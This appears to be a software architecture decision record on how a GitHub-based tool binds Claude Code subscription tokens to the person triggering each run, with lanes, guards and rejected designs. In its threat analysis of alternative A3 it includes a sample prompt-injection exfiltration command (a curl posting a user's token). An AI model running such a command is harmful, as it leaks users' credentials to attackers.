# ADR-0017: Claude Code Subscription Credential Strategies

**Status:** Accepted — 2026-10-22
**Decider:** Olivier Norture
**Related:** `docs/claude-code.md`, `docs/subscription-plans.md`, `docs/adoption.md`, ADR-0008 (secret-slot invariant), the `claude-code` harness (`src/nebuko/engine/harness/claude_code.py`, issues #1368/#1370), Anthropic Consumer Terms, Anthropic support correspondence (2026-10), Claude Code docs (authentication, GitHub Actions)

## Context

The `claude-code` harness runs every role turn through the **unmodified Claude
Code binary** — `claude-agent-sdk` drives it headless, with the engine's tools
served by an **in-process MCP server** (`create_sdk_mcp_server`) — so usage can
be billed to a user's **Claude subscription** (Pro/Max/Team/Enterprise seat)
instead of an API key. The requirement this ADR settles: make that work **for a
GitHub organization** — e.g. ten developers, each with their own subscription,
any of whom can trigger a run from any number of org repos, public and private
— while staying inside Anthropic's terms.

### The compliance inputs

Anthropic's Consumer Terms prohibit sharing account credentials, reselling,
and — except via an API key or where explicitly permitted — automated access.
The permission for our case, from Anthropic support (email on file, 2026-10):

> Based on how you've described pi-claude-bridge — it calls the official,
> unmodified `claude -p` CLI, which you've authenticated yourself through
> Anthropic's normal sign-in with your own Max subscription — this is
> permitted. [...] What's prohibited is a third party collecting or storing
> your credentials, offering its own Claude.ai login inside its app, or
> routing other people's usage through your subscription (or the reverse).
> This would stop being fine if pi-claude-bridge modified the Claude Code
> binary itself, or if it were used to let other people's requests run
> through your subscription.

Which yields four hard rules for any strategy:

1. **Binary only.** The subscription token may only be exercised by the
   unmodified Claude Code binary. Nebuko must never extract a token and call
   `api.anthropic.com` directly — not even for a "cheap" side call. The
   harness respects this: the token reaches the `claude` binary through its
   environment, and every model call goes through the binary.
2. **No custody.** Nebuko — tool, reusable workflow, harness, or broker —
   never collects or stores a Claude credential. The *user* storing their own
   token in their own GitHub repo secret is sanctioned: Anthropic's own
   `claude-code-action` and its `/install-github-app` flow write
   `CLAUDE_CODE_OAUTH_TOKEN` as a repository secret.
3. **Actor↔credential binding.** No routing usage through someone else's
   subscription, in either direction ("or the reverse"). Every human-triggered
   run must bill the subscription of the GitHub-authenticated triggerer.
4. **Automation gets no personal tokens.** Machine-triggered runs (cron, bots)
   have no actor to bind to. Anthropic's org guidance is explicit: for shared
   use, "authenticate with an API key from the Claude Console rather than an
   OAuth token, since an OAuth token is tied to the subscription of the
   person who ran `claude setup-token`".

### Facts that shape the solution space

- `claude setup-token` mints a **~1-year personal OAuth token**
  (`CLAUDE_CODE_OAUTH_TOKEN`), printed to the terminal, saved nowhere by the
  CLI. Interactive `/login` credentials live in the user's keychain /
  `~/.claude/.credentials.json`, owned by the binary — Nebuko never reads,
  copies, or uploads that file in any strategy.
- GitHub Actions has **no actor-scoped secret primitive**: the `secrets`
  context cannot be indexed dynamically, secrets are readable by any workflow
  in the repo, and no ACL binds a secret to a triggering actor. A repo's
  *ownership* is the only actor-scoped container GitHub offers.
- Self-hosted runner **labels are routing hints, not ACLs**: any workflow in a
  repo the runner group serves can request any label. GitHub's scheduler,
  however, is the one component that maps a computed label to a machine.
- Workload identity federation (GitHub OIDC → Console service account) gives
  **API-billed**, short-lived credentials with no stored secret — it does not
  exercise a subscription.
- Nebuko today: PAT mode (`GH_PAT` fallback) + the OIDC token broker
  (`token-broker.nebuko.dev`, backed by the GitHub App), and the reusable
  workflow's `CLAUDE_CODE_OAUTH_TOKEN` secret chain (`::add-mask::`, exported
  only when non-empty, never echoed). ADR-0008's invariant — credential
  values never travel through `with:` inputs, which the engine serializes
  into agent context — applies to every lane below.

## Decision

**Ship a multi-lane architecture bound by one invariant: a human-triggered
run bills the triggerer's own subscription; a machine-triggered run bills org
API credentials; Nebuko holds zero Claude credentials in every lane.**

### The lanes

**Lane L — local interactive (baseline).** Nebuko runs on the user's machine;
Claude Code uses its own `/login` session from the keychain. This is the
email's sanctioned shape verbatim ("a single-user local bridge"). No GitHub
involvement, no credential handling at all.

**Lane S — single-user repo secret (implemented).** One user's repo,
`CLAUDE_CODE_OAUTH_TOKEN` as a repository secret, GitHub-hosted runner —
Anthropic's own `claude-code-action` pattern, unchanged. The reusable workflow
declares the secret and exports it into the job environment only when it is
non-empty; the trigger workflow forwards it (#1402), and the run path drops it
from the environment of every backend except `claude-code` (see A3), so an
OpenHands run in the same workflow never sees it. **Scoped to single-user
semantics**: valid because the repo has exactly one triggerer. In a multi-user
repo this lane degenerates into the first rejected alternative below and must
be refused (guard 1).

**Lane R — actor-bound self-hosted runners (decided, implementation parked).**
Each org member registers their own org-level runner(s) with
`nebuko init anthropic-local-runner --org <org>` (label `nebuko-<login>`,
token in the runner's `0600 .env`, never a GitHub secret). The reusable
workflow computes `runs-on` from the trigger author:

```yaml
runs-on: ${{ inputs.runner_strategy == 'per-user' &&
             format('nebuko-{0}',
                    github.event.comment.user.login ||
                    github.event.issue.user.login ||
                    github.triggering_actor.login) ||
             inputs.runs_on || 'ubuntu-latest' }}
```

GitHub's scheduler does the actor→machine match; the token exists in exactly
one place and reaches a job only by being scheduled onto that machine. No
Claude credential is stored anywhere in GitHub. **Status: the decision stands,
the implementation is parked in a follow-up issue (#1393)** — `init/local_runner.py`,
the `runner_strategy` workflow input and the computed `runs-on` are not on
main yet. `docs/claude-code.md` documents only the hosted path until then.

**Lane D — per-user credential repo + App bridge (decided, not implemented).**
Each user keeps a private `<login>/nebuko-personal` repo holding their own
`CLAUDE_CODE_OAUTH_TOKEN` secret, plus a thin workflow pinned to the reusable
workflow's SHA. The GitHub App (webhook endpoint on the token broker, which
already holds the App key) bridges org-repo events:

```
issue_comment(created) → CALLER_AUTH checks → actor = comment.user.login
  → target = "{actor}/nebuko-personal"        # deterministic, no mapping table
  → mint 1h installation tokens (user repo, org repo)
  → POST /repos/{target}/dispatches  (event_type: nebuko-run,
       client_payload: { actor, org_repo, issue_number, prompt_body, gh_token })
```

The user-repo workflow first asserts
`github.event.client_payload.actor == github.repository_owner` (guard 4),
then calls the reusable workflow with its own secret and the 1h org-scoped
`GH_TOKEN`. Repo permissions are a **real ACL**: no other member can dispatch
into your repo or reach your secret, which makes the binding a hard boundary
rather than a routing convention.

**Lane K — org automation.** Scheduled/bot/external runs take
`ANTHROPIC_API_KEY` (Console) on hosted runners, or — preferred once the
broker supports it — workload identity federation (GitHub OIDC → Console
service account: `fdrl_…` federation rule, no long-lived secret stored at
all). API billing; zero personal tokens. `claude-code` runs triggered by
bots are refused in per-user modes (guard 3).

**Lane C — cloud providers (out of scope here).** The `use_bedrock` /
`use_vertex` / `use_foundry` path: GitHub OIDC → cloud IAM, short-lived cloud
credentials, cloud billing. Orthogonal to subscriptions; supported by the
same binary and not further specified.

### Comparison

| Lane | Trigger | Token stored | Bills | Binding mechanism | Limits |
|------|---------|--------------|-------|-------------------|--------|
| L | local user | user's keychain (binary-owned) | their subscription | physical machine | — |
| S | the repo's one user | their repo secret (GitHub) | their subscription | single-user semantics | 6h hosted job |
| R | org member | their runner's `.env` only | triggerer's subscription | scheduler label match | runner must be online; label-spoof insider risk (guards 5–6) |
| D | org member | their private repo secret (GitHub) | triggerer's subscription | **repo ACL** + owner assert | 6h hosted job; user's Actions minutes |
| K | machine | none (WIF) or org secret | org (API) | no personal token involved | — |

### Guards (in-ware, fail-fast)

1. Per-user mode (R/D) with a shared `CLAUDE_CODE_OAUTH_TOKEN` repo secret
   also set → **hard error**: ambiguity breaks binding (today's step only
   skips *empty* secrets; a set one would silently shadow a runner's or
   caller's own token).
2. Per-user mode ignores and rejects static `runs_on` values starting with
   `nebuko-`: `runs-on` is computed from the event author only. A caller
   passing a colleague's label is the routing violation as a one-liner.
3. Bot actors (`endsWith(actor, '[bot]')`), `schedule`, and actor-less events
   → refuse the `claude-code` backend with an actionable comment; point at
   Lane K.
4. The user-repo workflow (D) asserts `client_payload.actor ==
   repository_owner` before anything runs: even a buggy or misconfigured
   bridge cannot land someone else's work on your token.
5. The bridge's actor→repo mapping is the **rule** `actor == repo owner` —
   never a configurable table. A mapping database is where routing violations
   breed.
6. Insider risk on lane R (a member writing a custom workflow targeting
   `runs-on: nebuko-<colleague>`): labels are not ACLs, so this is mitigated
   by branch protection on `.github/workflows/**`, pinning `uses:` to a SHA,
   and a watchdog that flags runs whose runner label ≠ trigger actor and
   duplicate label registrations. Same trust boundary as existing repo
   secrets; documented, not hidden.
7. ADR-0008's invariant holds everywhere: values never through `with:`
   inputs; the bridge's `gh_token` travels as a `secrets:` mapping entry and
   is `::add-mask::`ed.

## Alternatives considered

**A1 — Shared repo/org OAuth secret in a multi-user repo.** One member's
setup-token as an org-level secret serving ten triggerers: nine people's usage
through one subscription — rule 3 by configuration. Anthropic's own docs steer
away ("rather than an OAuth token…"), and even on Team/Enterprise, where
billing lands on the org, it still violates the seat-holder's account terms
("make your Account available to anyone else"), breaks attribution and
revocation, and pools a personal credential into every org workflow. Rejected.

**A2 — Static single-owner runner label** (`runs_on: nebuko-<owner>`, today's
single-user doc story) **in multi-user repos.** All triggers land on the
owner's runner and token — the same routing violation via a label. Valid only
in Lane S semantics. Superseded by Lane R's computed label.

**A3 — Per-user secret selection ("load the user's own secret").** The right
instinct (it *is* rule 3) but GitHub mechanics make it the worst option: the
`secrets` context cannot be indexed dynamically, so a selector step must
materialize **all** users' tokens into its env and pick one. Consequences:
every member's token structurally shared with every other member and every
workflow ("share your Account login information" as an architecture
property); one prompt-injection exfiltration (`curl -d "$TOKEN_bob" …`) walks
away with ten subscriptions — masking covers logs, not exfiltration; and the
selector is a convention, not a boundary, since members can reference any
`secrets.*` directly. Dominated by R (no co-location) and D (real ACL).
Rejected.

The exfiltration surface also exists in Lane S, one token deep: the job
exports the token into the environment of *every* comment-triggered run, and
the OpenHands `terminal` tool inherits `os.environ`. `run_agent` therefore
removes `CLAUDE_CODE_OAUTH_TOKEN` from the environment of every backend except
`claude-code` (`harness/credentials.py::scrub_subscription_tokens`) before the
agent is built, so only the Claude Code binary — whose own tool surface is the
credential's intended consumer — ever holds it.

**A4 — Nebuko as credential custodian** (hosted vault, "connect your Claude
account" login-proxy, "login with Anthropic via Nebuko" OAuth flow, hosted
runners accepting user tokens). Makes Nebuko the "third party collecting or
storing your credentials" (rule 2) and structurally a subscription reseller.
Rejected regardless of encryption-at-rest promises.

**A5 — Reusing the interactive credential file** (copying
`~/.claude/.credentials.json` / keychain contents for CI or backend use).
Violates rule 2 (custody), fights the binary's refresh/revocation semantics,
and produces long-lived copies of session credentials. The sanctioned CI
instrument is `claude setup-token`. Rejected.

**A6 — Extracting the OAuth token to call the API directly** (e.g. for cheap
side-calls or provider routing). Rule 1 violation; also technically fragile
(the token is a bearer validated for the binary's flows). Rejected.

## Amendment: single-job lane (issue #1457)

For the `user-repo` lane, bot-comment continuation routing is replaced by a
single job. The engine's step driver runs the next automatic step in the same
process, on the same runner, under the same human trigger (`TRIGGER_AUTHOR_*`
stays the starter), so no bot comment hops back into the user repo and no org
token is minted for a continuation. Step comments carry no continue token. The
`lane-binding` guard stays as the safety net. Stops (gate, hold, failure, new
human comment, budget, expired token) end the job; the next step needs a human
comment or an explicit `step` dispatch.

## Consequences

### Implementation roadmap

1. ✅ `nebuko-workflow.yaml`: the `CLAUDE_CODE_OAUTH_TOKEN` secret input and
   its conditional, masked export (Lane S); the trigger workflow forwards it
   and the run path scrubs it from every non-`claude-code` backend (#1402).
2. `nebuko-workflow.yaml`: `runner_strategy` input (`static` | `per-user`),
   computed `runs-on`, bot rejection, guards 1–2 (shadowing + static label).
   *Parked with Lane R.*
3. Reusable workflow: a caller-provided `GH_PAT` fast path — when set, skip the
   OIDC broker step (it would otherwise overwrite `GH_TOKEN` with a token for
   the wrong repo) — plus `::add-mask::` parity. *Parked with Lane D.*
4. `nebuko init claude-code-repo`: create the private repo, `gh secret set`
   the token, deep-link the App installation, write the pinned workflow
   template with the owner-assert guard. *Parked with Lane D.*
5. Bridge: a `/webhooks/github` endpoint on the token broker — HMAC
   verification (`X-Hub-Signature-256`), CALLER_AUTH parity, idempotency on
   `comment.id`, deterministic target, two minted installation tokens,
   `repository_dispatch`. The broker holds the App private key and webhook
   secret; **no Claude credential ever reaches it.** *Parked with Lane D.*
6. `local_runner.py` (`nebuko init anthropic-local-runner`): optional
   `--runner-group` assignment (one `gh api` call) so org runners are
   group-scoped; keep the public-repo refusal. *Parked with Lane R.*
7. Watchdog (backend or scheduled job, credential-free): runner label ≠
   trigger actor, duplicate label registration, offline-runner queue with an
   onboarding report (`X/10 members have runners`). *Parked with Lane R.*
8. Docs: `docs/claude-code.md` (hosted path, per-role switch, what the harness
   does and does not support), `docs/subscription-plans.md` and
   `docs/adoption.md` cross-links.

### Accepted caveats

- **Lane D costs the user's Actions minutes** (private repo, hosted runners):
  a 1h agent run ≈ 60 Linux minutes; free tiers afford a handful of long runs.
  Lane R has no minutes cost. Say this in docs — it is the main adoption
  friction.
- **Lane R queues while the triggerer's runner is offline** (self-hosted jobs
  wait for a matching runner); the watchdog plus `--count ≥ 2` on always-on
  machines mitigate.
- **Lane D's payload `gh_token`** is visible to the repo owner via the run's
  event API: 1h-lived, org-repo-scoped, granting what the owner can already
  do. Documented, not hidden. Longer term, teach the broker to mint the
  org-scoped token from the user-repo OIDC claim and drop the payload token.
- **Public repos**: Lane R runners stay in groups that exclude public repos
  (GitHub default; keep the `--allow-public` refusal semantics); Lane D
  requires a *private* credential repo and keeps the comment-trigger
  CALLER_AUTH gate.

### Compliance mapping

| Rule | L | S | R | D | K |
|------|---|---|---|---|---|
| Binary only | ✓ | ✓ | ✓ | ✓ | ✓ (API lane, no subscription) |
| No Nebuko custody | ✓ | ✓ (GitHub is custodian) | ✓ (nothing in GitHub) | ✓ (GitHub is custodian) | ✓ |
| Actor binding | trivial | single user | scheduler label match | repo ACL + owner assert | n/a (org billing) |
| Automation separation | — | — | guard 3 | guard 3 | the lane itself |

### Enforcement posture

Anthropic's enforcement is account-level; the vendor risk is being
*categorized* as a reseller. The posture that keeps Nebuko safe: the compliant
behavior is the default on every path a user can reach without deliberately
attacking their own org; Nebuko never appears in a credential flow; marketing
says "bring your own subscription", never "we provide Claude". Users who
force a violation (shared secrets, custom cross-label workflows) do so as
their own visible act against their own accounts — and guards 1–5 make the
casual path impossible.

### Bot continuations (#1424)

Guard 3 refuses bot actors, schedule and actor-less runs. A bot-authored
continuation comment (`workflow-continue` / `bot-trigger` in its first two
lines, author in `TRUSTED_BOTS`) may run claude-code only when the previous
WORKFLOW_STATE's `started_by` is a non-bot human who still holds a
CALLER_AUTH association (and equals the credential owner in the per-user lane).
The engine enforces this in `run_agent._enforce_harness_credentials`. The
Lane D bridge (token-broker#53) needs the same rule; that is tracked there.

#### Verified dispatch actor (#1490)

A broker-created `repository_dispatch` is made with the App installation token,
so `github.actor` is the bot (`nebuko-staging[bot]`) and not the human. Guard 3
therefore takes the initiator from `client_payload.actor`, and only when that
equals `github.repository_owner`, a value GitHub sets. The bot is transport
only: the broker has already checked that the commenter holds a write
association on the project repo, and it dispatches only to
`{commenter}/nebuko-personal`. A dispatch whose payload actor is not the owner,
a `schedule` or actor-less event, and a bot on any other event are still refused.
This widens Guard 3's "no bot-started runs on a personal credential" for
owner-verified dispatches; the engine's `personal_dispatch_actor` is the shared
check behind it.

### Lane binding (user-repo continuations)

A workflow started in a user's own `<login>/nebuko-personal` repo (Lane D)
records `lane: user-repo` and `credential_owner: <login>` in WORKFLOW_STATE
(login only, never a secret). The fields come from the `WORKFLOW_LANE` and
`CLAUDE_CREDENTIAL_OWNER` env vars on the first step and are carried forward by
every later transition.

`run_agent._enforce_harness_credentials` refuses a bot continuation whose
previous state has `lane: user-repo` unless this run is in the same lane
(`WORKFLOW_LANE=user-repo`) for the same `credential_owner`. This applies to
every backend: a continuation that would move the payer or the model silently
(for example the org's shared claude-code token, or an API-key profile) is
refused with a message to resume in `<login>/nebuko-personal`. Human-triggered
runs are not continuations and are not bound by this rule.

Routing continuations to the user repo is option A of the design issue. The
bridge (token-broker#53) owns it. It must accept `nebuko[bot]` continuations
whose `started_by` owns a `<login>/nebuko-personal` repo and dispatch there,
with `client_payload` carrying `step`, `agent_config` and `lane`. Until it lands,
Lane D continuations are refused at the first hand-off (option C), never run on
another payer (option B is not used silently).

#### Dispatch payload contract (Lane D)

- `client_payload.step` (optional): the step to run. Missing or blank means the
  workflow's first step, so today's dispatch is unchanged.
- `client_payload.agent_config` (optional): the agent config to run that step with.
- The engine reads `step` and `agent_config` from the event's `client_payload`
  (`Trigger.step` / `Trigger.agent_config`); the template does not forward them through
  `with:`, so no reusable-workflow input is needed. The template never forwards
  `lane` or `credential_owner`: the engine
  derives the lane from a `repository_dispatch` run (owner = `GITHUB_REPOSITORY_OWNER`,
  actor = `client_payload.actor`). `WORKFLOW_LANE` and `CLAUDE_CREDENTIAL_OWNER` are
  overrides only, and the guard must hold when they are absent (ADR-0008: no
  credential travels through `with:`).
- **Re-baseline rule:** a fresh `/nebuko run workflow` (no `--step`) starts a new
  workflow. It takes the shared lane unless its own run is in a user repo, so the
  previous state's lane and owner are not carried into it. Continuations carry the
  lane forward.
- **Trusted-state rule:** only a state written by a trusted (bot) author is read as
  the lane source. A thread whose only state comments are untrusted, or whose hand-off
  is undecodable, is treated as user-repo (fail closed).
- **Older engines:** the codec refuses a state with `schema_version` above the
  engine's when it carries a lane, and a refused hand-off is treated as untrusted.
  This does not protect a user repo pinned to an older reusable workflow, which drops
  the lane on re-encode. That residual risk is documented here; pin bumps are not
  automated by this change.

### Lane flags and personal-lane config (issue #1479)

- Grammar: `--personal` and `--project` are valueless flags on `run`, `resume`,
  `approve gate` and `reject gate`; both together is refused. The project side
  skips a comment carrying `--personal` with no reply and no label change; the
  broker dispatches it to the personal repo, where the flag is consumed.
- The personal repo is recognised by `GITHUB_REPOSITORY` ending in
  `/nebuko-personal`, a value GitHub sets for the run.
- Lane D needs the reusable workflow to check the personal repo out read-only at
  `.nebuko-personal` (default branch, `persist-credentials: false`) before the
  engine step. That step is not applied in this change (issue 1483 tracks the
  workflow patch). Until a human applies it, a personal run has no checkout: it
  reads only the shipped `defaults/agents`, and its first comment says the
  checkout is missing. The personal lane resolves its agent config in that
  checkout, then the shipped `defaults/agents`. It never reads
  the project's `.nebuko/agents`, and it checks the config's `api_token_env`
  secrets against the personal environment only.
- Config name order: `--config`, the previous state (dropped on a takeover or
  lane switch), the personal manifest (personal lane only, `agent_config` only),
  the project manifest, then the shipped default. The previous state sits before
  the manifests on purpose: a resumed run keeps the config it started with, so an
  edited manifest does not change a run mid-flight. A previous name that no longer
  resolves warns and falls back to the manifests and default, in both lanes.
- Caller trade-off: the project caller's `if:` skips only the exact one-flag
  shapes `/nebuko run workflow|approve gate|reject gate|resume --personal` (one
  line, no other flag). A GitHub expression cannot count flags, read a value or
  inspect a later line, so every other comment starts a runner and the engine's
  `parse_trigger` (first line only) skips or answers it. Pinned by
  `test_caller_personal_guard.py`, which runs the condition over the shared
  samples and asserts that no project run row is skipped.
- Gate decisions via dispatch: see "Gate decisions via dispatch (issue #1482)".


### Gate decisions via dispatch (issue #1482)

A dispatched `/nebuko approve gate` or `reject gate` to the personal repo decides
the gate as the repository owner, when the engine verifies that owner. The
anchor is computed in the engine from values GitHub sets:

- **Trusted:** `GITHUB_EVENT_NAME` (`repository_dispatch`), `GITHUB_REPOSITORY`
  (ends with `/nebuko-personal`), `GITHUB_REPOSITORY_OWNER`, and `REPO_NAME` (the
  dispatched `org_repo`). The actor must equal the owner. Then the engine runs a
  permission lookup on the project repo: `gh api repos/<project>/collaborators/<actor>/permission`.
  Write, maintain or admin is needed. The decision is recorded with the actor as
  `decided_by`.
- **Not trusted:** the caller workflow's files and owner guard, its flags, its env,
  and the credential. The caller guard is the user's own file, so it cannot be an
  anchor. The lane check and the gate check share one function
  (`verify_dispatch_actor` calls `personal_dispatch_actor`), so the owner rule is
  implemented once.
- **Lookup token:** `GH_TOKEN` in the engine step. The reusable workflow sets it
  from the caller's `GH_PAT` (the payload `gh_token`) when present, otherwise from
  the broker. The token only reads the permission; it is never an identity.
  Without a token the gate is refused.
- **Project repo from the payload.** `REPO_NAME` comes from the dispatched
  `org_repo`, but the gate is decided on that repository's issue. A forged
  `org_repo` only selects a repository where the actor already has authority.
  `GITHUB_REPOSITORY` is never used, because the owner has admin on their own
  personal repo.
- **Outcomes.** Anything except write, maintain or admin fails closed, with a
  `gate_noop` notice that names a coarse reason and no token:
  - `no-write-access`: GitHub answered with `read`, `triage` or `none`. A
    non-collaborator is expected to get `none` with HTTP 200; this is not yet
    measured.
  - `lookup-refused-by-github`: HTTP 403 or 404. This is not evidence of missing
    write access. The notice says so.
  - `lookup-timed-out` (30 s), `lookup-unavailable` (no network or no `gh`),
    `no-project-token`, `no-project-repo`: the lookup did not run or did not answer.
  - Not the owner, or not a personal-repo dispatch: refused as before; the
    project repo's dispatch path is unchanged.
- **Measurement not yet done.** Whether a token minted by the broker can read
  `collaborators/{user}/permission` on the project repo is not verified. A human
  must test once with a token minted by the staging App, dispatch `approve gate`
  at a held gate, and record the result here. If the lookup returns HTTP 403, the
  broker must add the repository permission GitHub names for this endpoint
  (follow-up to token-broker#53); that permission is not yet identified. Until the
  test passes, the gate stays undecidable from the personal lane (fail closed).
  Result: _pending human test_.
